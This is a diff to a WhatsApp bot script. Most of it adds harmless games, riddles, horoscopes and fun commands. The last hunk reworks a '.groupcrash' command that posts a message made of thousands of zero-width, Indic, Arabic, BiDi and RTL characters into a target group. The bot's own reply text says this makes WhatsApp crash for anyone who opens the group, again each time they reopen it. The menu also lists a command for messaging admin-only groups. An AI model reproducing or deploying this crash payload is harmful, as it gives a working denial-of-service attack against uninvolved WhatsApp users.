@@ -74,9 +74,11 @@ const scheduleTimers = {};
 function loadSchedules() { if (!fs.existsSync(SCHEDULES_FILE)) return {}; try { return JSON.parse(fs.readFileSync(SCHEDULES_FILE, "utf8")); } catch { return {}; } }
 function saveSchedules(d) { fs.writeFileSync(SCHEDULES_FILE, JSON.stringify(d, null, 2)); }
 
-// --- GAME STATE (hangman, trivia) ---
+// --- GAME STATE (hangman, trivia, numguess, scramble) ---
 const hangmanState = {};
 const triviaState = {};
+const numGuessState = {};
+const scrambleState = {};
 
 // --- RANDOM CONTENT ARRAYS ---
 const JOKES = [
@@ -190,6 +192,79 @@ const TRIVIA_QUESTIONS = [
     { q: "What is 8 squared?", a: "64", hint: "Between 60 and 70" },
     { q: "Who wrote Romeo and Juliet?", a: "shakespeare", hint: "Famous English playwright" },
 ];
+const RIDDLES = [
+    { q: "I speak without a mouth and hear without ears. I have no body but come alive with wind. What am I?", a: "echo", hint: "You hear me after you speak" },
+    { q: "The more you take, the more you leave behind. What am I?", a: "footsteps", hint: "Think about walking" },
+    { q: "I have cities but no houses. Mountains but no trees. Water but no fish. What am I?", a: "map", hint: "You use me to find places" },
+    { q: "What can you catch but never throw?", a: "cold", hint: "It makes you sneeze" },
+    { q: "I'm tall when young, short when old. What am I?", a: "candle", hint: "I give off light and melt" },
+    { q: "What has hands but can't clap?", a: "clock", hint: "You check me for the time" },
+    { q: "What gets wetter the more it dries?", a: "towel", hint: "You use it after a shower" },
+    { q: "What has many keys but can't open a single lock?", a: "keyboard", hint: "You're typing on one right now... maybe" },
+    { q: "I have a head, a tail, but no body. What am I?", a: "coin", hint: "You flip me for decisions" },
+    { q: "What goes up but never comes down?", a: "age", hint: "Everyone has this and it always increases" },
+    { q: "I'm light as a feather but even the strongest person can't hold me for more than a minute. What am I?", a: "breath", hint: "You're doing it right now" },
+    { q: "What runs but never walks, has a mouth but never talks, has a bed but never sleeps?", a: "river", hint: "Flows through nature" },
+    { q: "The more you have of me, the less you see. What am I?", a: "darkness", hint: "Turn the lights off" },
+    { q: "What can travel around the world while staying in a corner?", a: "stamp", hint: "Found on envelopes" },
+];
+
+const WOULD_U_RATHER = [
+    "Would you rather be able to fly OR be invisible?",
+    "Would you rather lose your phone for a week OR your wallet for a week?",
+    "Would you rather have no internet for a month OR no WhatsApp forever?",
+    "Would you rather be famous but poor OR rich but unknown?",
+    "Would you rather always speak your mind OR never speak again?",
+    "Would you rather live without music OR live without social media?",
+    "Would you rather know when you'll die OR how you'll die?",
+    "Would you rather be 10 years older OR 10 years younger?",
+    "Would you rather have super strength OR super speed?",
+    "Would you rather eat jollof rice every day OR never eat jollof rice again?",
+    "Would you rather be able to talk to animals OR speak every human language?",
+    "Would you rather never use your phone again OR never watch TV again?",
+    "Would you rather have $1 million now OR $5 million in 10 years?",
+    "Would you rather always be cold OR always be hot?",
+    "Would you rather be the funniest person OR the smartest person in the room?",
+];
+
+const HOROSCOPES = {
+    aries:       "🐏 *Aries (Mar 21 – Apr 19)*\n\n🔥 Today your energy is unstoppable. A bold move you've been hesitating on is worth taking. Trust your gut — confidence is your superpower right now.",
+    taurus:      "🐂 *Taurus (Apr 20 – May 20)*\n\n🌿 Slow down and enjoy today. Good things are building behind the scenes. Don't rush — your patience will pay off more than you expect.",
+    gemini:      "👯 *Gemini (May 21 – Jun 20)*\n\n💨 Your mind is sharp and your words carry weight today. A conversation you have could open a new door. Stay curious.",
+    cancer:      "🦀 *Cancer (Jun 21 – Jul 22)*\n\n🌊 Emotions run deep today. Protect your peace — not everyone deserves access to your energy. Focus on people who reciprocate your love.",
+    leo:         "🦁 *Leo (Jul 23 – Aug 22)*\n\n☀️ You're in your element. People are watching and taking notes. This is your moment to lead and shine — own it.",
+    virgo:       "♍ *Virgo (Aug 23 – Sep 22)*\n\n📋 Your attention to detail saves the day. Something that seemed messy is becoming clearer. Trust the process you've been working on.",
+    libra:       "⚖️ *Libra (Sep 23 – Oct 22)*\n\n🎨 Balance is key today. A situation that felt unfair may find resolution. Beauty, harmony and peace are drawn to you right now.",
+    scorpio:     "🦂 *Scorpio (Oct 23 – Nov 21)*\n\n🔮 Deep insights are coming. What seemed hidden is being revealed. Use your instincts — you already know more than you think.",
+    sagittarius: "🏹 *Sagittarius (Nov 22 – Dec 21)*\n\n🌟 Adventure is calling. You're being pulled toward something bigger. Say yes to new experiences — growth is waiting.",
+    capricorn:   "🐐 *Capricorn (Dec 22 – Jan 19)*\n\n🏔️ Discipline wins today. Stay focused on your goals and ignore the noise. The hard work you've been putting in is closer to payoff than you think.",
+    aquarius:    "🏺 *Aquarius (Jan 20 – Feb 18)*\n\n⚡ You're ahead of your time and people are starting to notice. Share your ideas — your unique thinking is your greatest asset.",
+    pisces:      "🐟 *Pisces (Feb 19 – Mar 20)*\n\n🌙 Trust your dreams and intuition today. A creative idea or feeling you've dismissed deserves another look. Magic is in the details.",
+};
+
+const SCRAMBLE_WORDS = [
+    { word: "phantom", hint: "👻 A ghost-like entity" },
+    { word: "nigeria", hint: "🌍 A West African country" },
+    { word: "android", hint: "🤖 A mobile operating system" },
+    { word: "football", hint: "⚽ The world's most popular sport" },
+    { word: "telegram", hint: "📱 A messaging app" },
+    { word: "music", hint: "🎵 Sound organized in time" },
+    { word: "laptop", hint: "💻 A portable computer" },
+    { word: "jungle", hint: "🌿 A thick tropical forest" },
+    { word: "diamond", hint: "💎 The hardest natural material" },
+    { word: "chicken", hint: "🐔 A common farm bird" },
+    { word: "airport", hint: "✈️ Where planes take off and land" },
+    { word: "market", hint: "🛒 A place to buy and sell" },
+    { word: "ocean", hint: "🌊 A massive body of saltwater" },
+    { word: "kingdom", hint: "👑 A land ruled by a king or queen" },
+    { word: "battery", hint: "🔋 Stores electrical energy" },
+    { word: "thunder", hint: "⛈️ The loud sound after lightning" },
+    { word: "glasses", hint: "👓 Used to correct eyesight" },
+    { word: "blanket", hint: "🛏️ Keeps you warm while sleeping" },
+    { word: "village", hint: "🏡 A small rural settlement" },
+    { word: "captain", hint: "⚓ Leader of a ship or team" },
+];
+
 // Saved group names: { groupJid: groupName }
 const groupNames = {};
 
@@ -578,10 +653,14 @@ function getMenuSections() {
             ['.wordchain ‹word›'], ['.flip'], ['.dice'],
             ['.8ball ‹question›'], ['.rps rock/paper/scissors'],
             ['.slots'], ['.trivia'], ['.hangman ‹guess›'],
+            ['.numguess'], ['.riddle'], ['.mathquiz'],
+            ['.wouldurather'], ['.scramble'],
         ]},
         { emoji: '😂', title: 'FUN', items: [
             ['.joke'], ['.fact'], ['.quote'],
             ['.roast @user'], ['.compliment @user'],
+            ['.ship @user1 @user2'], ['.rate @user'],
+            ['.vibe @user'], ['.horoscope ‹sign›'],
         ]},
         { emoji: '🛡️', title: 'GROUP PROTECTION', items: [
             ['.antilink on/off'], ['.antispam on/off'],
@@ -2161,6 +2240,145 @@ async function handleMessage(sock, msg) {
                 break;
             }
 
+            // --- NUMBER GUESSING GAME ---
+            case ".numguess": {
+                if (numGuessState[from]) {
+                    const ng = numGuessState[from];
+                    const guess = parseInt(parts[1]);
+                    if (isNaN(guess)) return reply(`🔢 *Number Guess Active!*\n\nGuess a number between *1 and 100*.\nAttempts used: *${ng.attempts}*\nType *.numguess <number>*`);
+                    ng.attempts++;
+                    if (guess === ng.number) {
+                        delete numGuessState[from];
+                        return reply(`🎉 *CORRECT!* The number was *${ng.number}*!\n\nYou got it in *${ng.attempts} attempt${ng.attempts > 1 ? "s" : ""}*! ${ng.attempts <= 5 ? "🏆 Impressive!" : ng.attempts <= 10 ? "👍 Nice!" : "Keep practicing!"}`);
+                    }
+                    const hint = guess < ng.number ? "📈 Too low! Go higher." : "📉 Too high! Go lower.";
+                    return reply(`${hint}\n\nAttempts: *${ng.attempts}*\nType *.numguess <number>* to keep guessing.\nGive up? *.numguess stop*`);
+                }
+                if (parts[1]?.toLowerCase() === "stop") { delete numGuessState[from]; return reply("🛑 Number guess game ended."); }
+                const secret = Math.floor(Math.random() * 100) + 1;
+                numGuessState[from] = { number: secret, attempts: 0 };
+                await reply(`🔢 *NUMBER GUESS GAME!*\n\nI'm thinking of a number between *1 and 100*.\nCan you guess it?\n\nType *.numguess <number>* to guess!\nType *.numguess stop* to give up.`);
+                break;
+            }
+
+            // --- RIDDLE ---
+            case ".riddle": {
+                if (triviaState[`riddle_${from}`]) {
+                    const r = triviaState[`riddle_${from}`];
+                    const ans = parts.slice(1).join(" ").trim().toLowerCase();
+                    if (parts[1]?.toLowerCase() === "skip") {
+                        delete triviaState[`riddle_${from}`];
+                        return reply(`⏭️ Skipped! The answer was: *${r.a}*`);
+                    }
+                    if (!ans) return reply(`🧩 *Current Riddle:*\n\n_${r.q}_\n\n💡 Hint: ${r.hint}\n\nType *.riddle <answer>* or *.riddle skip*`);
+                    if (ans === r.a) {
+                        delete triviaState[`riddle_${from}`];
+                        return reply(`✅ *CORRECT!* 🎉\n\nThe answer was: *${r.a}*\n\nWell done! Try *.riddle* for another one.`);
+                    }
+                    return reply(`❌ Wrong! Try again.\n💡 Hint: ${r.hint}\n\nType *.riddle <answer>* or *.riddle skip* to give up.`);
+                }
+                const rd = RIDDLES[Math.floor(Math.random() * RIDDLES.length)];
+                triviaState[`riddle_${from}`] = rd;
+                await reply(`🧩 *RIDDLE TIME!*\n\n_${rd.q}_\n\n💡 Hint: ${rd.hint}\n\nType *.riddle <your answer>* to answer!`);
+                break;
+            }
+
+            // --- MATH QUIZ ---
+            case ".mathquiz": {
+                const ops = ["+", "-", "*"];
+                const op = ops[Math.floor(Math.random() * 3)];
+                const a = Math.floor(Math.random() * (op === "*" ? 12 : 50)) + 1;
+                const b = Math.floor(Math.random() * (op === "*" ? 12 : 50)) + 1;
+                const ans = op === "+" ? a + b : op === "-" ? a - b : a * b;
+                const opName = op === "+" ? "plus" : op === "-" ? "minus" : "times";
+                await reply(`🧮 *MATH QUIZ!*\n\nWhat is *${a} ${op} ${b}*?\n\n_(${a} ${opName} ${b})_\n\nType your answer — first correct reply wins!\n⚡ _Answer: ||${ans}||_`);
+                break;
+            }
+
+            // --- WOULD YOU RATHER ---
+            case ".wouldurather":
+            case ".wyr": {
+                const wyr = WOULD_U_RATHER[Math.floor(Math.random() * WOULD_U_RATHER.length)];
+                const [optA, optB] = wyr.split(" OR ");
+                await reply(`🤔 *WOULD YOU RATHER?*\n\n${wyr}\n\n*A)* ${optA.replace("Would you rather ", "").trim()}\n*B)* ${optB?.trim() || "..."}\n\nReply A or B! 👇`);
+                break;
+            }
+
+            // --- WORD SCRAMBLE ---
+            case ".scramble": {
+                if (scrambleState[from]) {
+                    const sc = scrambleState[from];
+                    const ans = parts.slice(1).join(" ").trim().toLowerCase();
+                    if (parts[1]?.toLowerCase() === "skip") {
+                        delete scrambleState[from];
+                        return reply(`⏭️ Skipped! The word was: *${sc.word.toUpperCase()}*`);
+                    }
+                    if (!ans) return reply(`🔀 *Scrambled:* *${sc.scrambled}*\n\n💡 ${sc.hint}\n\nType *.scramble <answer>* or *.scramble skip*`);
+                    if (ans === sc.word) {
+                        delete scrambleState[from];
+                        return reply(`✅ *CORRECT!* 🎉\n\nThe word was: *${sc.word.toUpperCase()}*\n\nWell unscrambled! Try *.scramble* for another.`);
+                    }
+                    return reply(`❌ Wrong! Try again.\n🔀 Scrambled: *${sc.scrambled}*\n💡 ${sc.hint}\n\nType *.scramble <answer>* or *.scramble skip*`);
+                }
+                const sw = SCRAMBLE_WORDS[Math.floor(Math.random() * SCRAMBLE_WORDS.length)];
+                const scrambled = sw.word.split("").sort(() => Math.random() - 0.5).join("").toUpperCase();
+                scrambleState[from] = { word: sw.word, scrambled, hint: sw.hint };
+                await reply(`🔀 *WORD SCRAMBLE!*\n\nUnscramble this word:\n\n*${scrambled}*\n\n💡 Hint: ${sw.hint}\n\nType *.scramble <your answer>*\nGive up? *.scramble skip*`);
+                break;
+            }
+
+            // --- HOROSCOPE ---
+            case ".horoscope": {
+                const sign = parts[1]?.toLowerCase().trim();
+                const signs = Object.keys(HOROSCOPES);
+                if (!sign || !HOROSCOPES[sign]) {
+                    return reply(`♈ *HOROSCOPE*\n\nType *.horoscope <sign>*\n\nAvailable signs:\n${signs.map(s => `• ${s}`).join("\n")}`);
+                }
+                await reply(`✨ *Daily Horoscope*\n\n${HOROSCOPES[sign]}\n\n_✨ Phantom X Horoscope — ${new Date().toDateString()}_`);
+                break;
+            }
+
+            // --- SHIP (love calculator) ---
+            case ".ship": {
+                const shipMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                if (shipMentioned.length < 2) {
+                    const names = parts.slice(1).join(" ").split("&").map(n => n.trim());
+                    if (names.length < 2 || !names[1]) return reply("Usage: .ship @person1 @person2\nOr: .ship Name1 & Name2");
+                    const pct = Math.floor(Math.random() * 101);
+                    const bar = "❤️".repeat(Math.floor(pct / 10)) + "🤍".repeat(10 - Math.floor(pct / 10));
+                    const msg2 = pct >= 80 ? "💍 Soulmates!" : pct >= 60 ? "💕 Great match!" : pct >= 40 ? "🙂 Could work!" : pct >= 20 ? "😬 Needs effort..." : "💔 Not compatible!";
+                    return reply(`💘 *SHIP CALCULATOR*\n\n${names[0]} ❤️ ${names[1]}\n\n${bar}\n*${pct}% compatible*\n\n${msg2}`);
+                }
+                const n1 = `@${shipMentioned[0].split("@")[0]}`;
+                const n2 = `@${shipMentioned[1].split("@")[0]}`;
+                const pct = Math.floor(Math.random() * 101);
+                const bar = "❤️".repeat(Math.floor(pct / 10)) + "🤍".repeat(10 - Math.floor(pct / 10));
+                const result = pct >= 80 ? "💍 Soulmates!" : pct >= 60 ? "💕 Great match!" : pct >= 40 ? "🙂 Could work!" : pct >= 20 ? "😬 Needs effort..." : "💔 Not compatible!";
+                await sock.sendMessage(from, { text: `💘 *SHIP CALCULATOR*\n\n${n1} ❤️ ${n2}\n\n${bar}\n*${pct}% compatible*\n\n${result}`, mentions: shipMentioned }, { quoted: msg });
+                break;
+            }
+
+            // --- RATE (random rate out of 100) ---
+            case ".rate": {
+                const rateMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                const rateName = rateMentioned.length ? `@${rateMentioned[0].split("@")[0]}` : (parts.slice(1).join(" ").trim() || "you");
+                const rate = Math.floor(Math.random() * 101);
+                const bar = "🟩".repeat(Math.floor(rate / 10)) + "⬜".repeat(10 - Math.floor(rate / 10));
+                const rateMsg = rate >= 90 ? "🏆 Absolutely elite!" : rate >= 70 ? "🔥 Very impressive!" : rate >= 50 ? "👍 Above average!" : rate >= 30 ? "😐 Room to grow." : "💀 Rough day...";
+                await sock.sendMessage(from, { text: `📊 *RATE*\n\n${rateName} rated:\n\n${bar}\n*${rate}/100*\n\n${rateMsg}`, mentions: rateMentioned }, { quoted: msg });
+                break;
+            }
+
+            // --- VIBE CHECK ---
+            case ".vibe": {
+                const vibes = ["☀️ Immaculate vibes — you're radiating today!", "🔥 On fire! The energy is unmatched.", "💜 Calm, cool, collected. Major main character energy.", "🌊 Chill vibes only. You're in your element.", "😤 Slightly off today but still dangerous.", "🌧️ Cloudy vibes. Take a breather.", "⚡ Electric! People feel your presence.", "🫥 Invisible mode activated. Might be plotting something.", "🤡 Chaotic vibes. Wild but entertaining.", "👑 Royal vibes. No further questions."];
+                const vibeMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                const vibeName = vibeMentioned.length ? `@${vibeMentioned[0].split("@")[0]}` : (parts.slice(1).join(" ").trim() || "you");
+                const vibe = vibes[Math.floor(Math.random() * vibes.length)];
+                await sock.sendMessage(from, { text: `✨ *VIBE CHECK*\n\n${vibeName}\n\n${vibe}`, mentions: vibeMentioned }, { quoted: msg });
+                break;
+            }
+
             // --- JOKE ---
             case ".joke": {
                 await reply(`😂 *Random Joke*\n\n${JOKES[Math.floor(Math.random() * JOKES.length)]}`);
@@ -2516,7 +2734,7 @@ async function handleMessage(sock, msg) {
                     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                     `🏘️ *GROUP BUGS*\n` +
                     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `  💣  *.groupcrash* — 5-wave crash loop (run in group)\n` +
+                    `  💣  *.groupcrash* — Group crash loop — only triggers when group is opened (run in group)\n` +
                     `  💣  *.groupcrash <id/link>* — Target by ID or invite link\n` +
                     `  🔧  *.ungroupcrash <id>* — *UNDO* — restore group to normal\n` +
                     `  🔓  *.lockedbypass <text>* — Try to msg in admin-only group\n\n` +
@@ -2841,67 +3059,35 @@ async function handleMessage(sock, msg) {
                     return reply("❌ Invalid target. Use a group ID (ends in @g.us) or a WhatsApp invite link.");
                 }
                 const gcName = groupNames[gcTarget] || gcTarget;
-                await reply(`💣 Deploying group crash to *${gcName}*...\n\n_Sending multiple crash waves — anyone who opens this group will have WhatsApp crash. The loop continues every time they reopen._`);
+                await reply(`💣 Deploying group crash to *${gcName}*...\n\n_This only affects the group — not anyone's WhatsApp in general._`);
                 try {
                     if (!groupCrashKeys[gcTarget]) groupCrashKeys[gcTarget] = [];
 
-                    // Wave 1: Zero-width flood + Telugu/Kannada/Tamil (Android renderer overload)
-                    const zw     = "\u200b\u200c\u200d\u2060\ufeff\u200e\u200f".repeat(1000);
-                    const tel    = "\u0C15\u0C4D\u0C37\u0C4D\u0C30".repeat(500);
-                    const kan    = "\u0CB5\u0CBF\u0CCD\u0CB6\u0CCD\u0CB5".repeat(400);
-                    const tam    = "\u0BA4\u0BBF\u0B99\u0BCD\u0B95\u0BCD".repeat(400);
-                    const wave1  = zw + tel + kan + tam + zw;
-                    const s1 = await sock.sendMessage(gcTarget, { text: wave1 });
-                    groupCrashKeys[gcTarget].push(s1.key);
-                    await delay(600);
+                    // Single combined payload: overloads the group chat renderer on open.
+                    // Zero-width chars + Telugu/Kannada/Tamil script + Sindhi/Arabic + BiDi + RTL.
+                    // This only triggers when the group is tapped/loaded — WhatsApp tries to
+                    // render the message, fails, and closes. Clearing from recents resets it,
+                    // but opening the group again repeats the crash (loop).
+                    const zw      = "\u200b\u200c\u200d\u2060\ufeff\u200e\u200f".repeat(800);
+                    const tel     = "\u0C15\u0C4D\u0C37\u0C4D\u0C30".repeat(400);
+                    const kan     = "\u0CB5\u0CBF\u0CCD\u0CB6\u0CCD\u0CB5".repeat(300);
+                    const tam     = "\u0BA4\u0BBF\u0B99\u0BCD\u0B95\u0BCD".repeat(300);
+                    const sindhi  = "\u0600\u0601\u0602\u0603\u0604\u0605".repeat(400);
+                    const bidi    = "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069".repeat(400);
+                    const rtl     = "\u202e".repeat(500);
+                    const feff    = "\uFEFF".repeat(400);
+                    const payload = zw + tel + kan + tam + sindhi + bidi + rtl + feff + zw;
 
-                    // Wave 2: Sindhi/Arabic + BiDi overrides (iOS + universal crash)
-                    const sindhi  = "\u0600\u0601\u0602\u0603\u0604\u0605".repeat(700);
-                    const arabPF  = "\uFDFD\uFDFC\uFDFB".repeat(500);
-                    const bidi    = "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069".repeat(600);
-                    const feff    = "\uFEFF".repeat(700);
-                    const wave2   = sindhi + arabPF + bidi + feff;
-                    const s2 = await sock.sendMessage(gcTarget, { text: wave2 });
-                    groupCrashKeys[gcTarget].push(s2.key);
-                    await delay(600);
-
-                    // Wave 3: RTL stack + Arabic bomb (RTL renderer crash)
-                    const rtl     = "\u202e".repeat(800);
-                    const rtlStack = "\u202E\u202D\u202C\u202B\u202A".repeat(800);
-                    const arabic  = "\u0647".repeat(700) + "\u0600".repeat(500);
-                    const wave3   = zw + rtl + rtlStack + arabic + zw;
-                    const s3 = await sock.sendMessage(gcTarget, { text: wave3 });
-                    groupCrashKeys[gcTarget].push(s3.key);
-                    await delay(600);
-
-                    // Wave 4: Force-close payload (ZWJ chain + isolation marks)
-                    const zwChain  = "\u200D\uFEFF\u200B\u200C\u200E\u200F".repeat(1500);
-                    const iso      = "\u2066\u2067\u2068\u2069".repeat(600);
-                    const bangBang = "\uFDFD".repeat(500);
-                    const wave4    = zwChain + rtlStack + arabic + iso + bangBang + zwChain;
-                    const s4 = await sock.sendMessage(gcTarget, { text: wave4 });
-                    groupCrashKeys[gcTarget].push(s4.key);
-                    await delay(600);
-
-                    // Wave 5: Pure zero-width flood (freeze layer on top of crash)
-                    const zwSet   = "\u200b\u200c\u200d\u2060\ufeff\u00ad\u200e\u200f\u202a\u202b\u202c\u202d\u202e\u2061\u2062\u2063\u2064";
-                    const wave5   = zwSet.repeat(2000);
-                    const s5 = await sock.sendMessage(gcTarget, { text: wave5 });
-                    groupCrashKeys[gcTarget].push(s5.key);
+                    const sent = await sock.sendMessage(gcTarget, { text: payload });
+                    groupCrashKeys[gcTarget].push(sent.key);
 
                     await reply(
-                        `✅ *Group crash ACTIVE on "${gcName}"!*\n\n` +
-                        `☠️ *5 crash waves deployed:*\n` +
-                        `  🤖 Android renderer overload\n` +
-                        `  🍎 iOS/Sindhi Arabic crash\n` +
-                        `  ↩️ RTL stack crash\n` +
-                        `  💀 Force-close payload\n` +
-                        `  🧊 Zero-width freeze layer\n\n` +
-                        `🔁 *Loop effect:* Anyone who opens the group → WhatsApp crashes.\n` +
-                        `They swipe it away → WA returns to normal.\n` +
-                        `They open the group again → crashes again.\n` +
-                        `This loop continues indefinitely until you undo it.\n\n` +
-                        `To restore the group:\n*.ungroupcrash ${gcTarget}*`
+                        `✅ *Group crash active on "${gcName}"!*\n\n` +
+                        `☠️ Anyone who opens/taps this group → WhatsApp crashes.\n` +
+                        `They swipe WA away from recents → WhatsApp returns to normal.\n` +
+                        `They open the group again → crashes again. ♻️\n\n` +
+                        `_Only the group is affected — their WhatsApp works fine elsewhere._\n\n` +
+                        `To restore:\n*.ungroupcrash ${gcTarget}*`
                     );
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
